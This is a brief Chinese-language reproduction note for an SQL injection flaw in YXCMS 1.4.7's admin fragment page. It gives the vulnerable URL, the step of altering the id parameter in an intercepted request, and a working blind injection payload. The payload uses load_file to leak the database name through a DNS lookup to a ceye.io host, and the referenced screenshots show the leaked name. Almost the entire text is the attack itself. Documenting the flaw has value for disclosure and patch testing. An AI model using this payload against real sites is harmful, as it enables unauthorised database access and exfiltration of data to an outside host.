###1. 影响版本 ###
1.4.7
###2.漏洞复现 ###

url:/index.php?r=admin/fragment/index
![](YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/Yi63i8.png)
利用ceye得到的回显
用bp抓包，修改id为

 payload:

    2 and if((select load_file(concat('\\',(select database()),'.36rdia.ceye.io\abc'))),2,2)


在ceye上面可以得到回显：

![](YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/Yi6qOA.png)
得到了数据库名称yxcms
![](YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/YicZkV.png)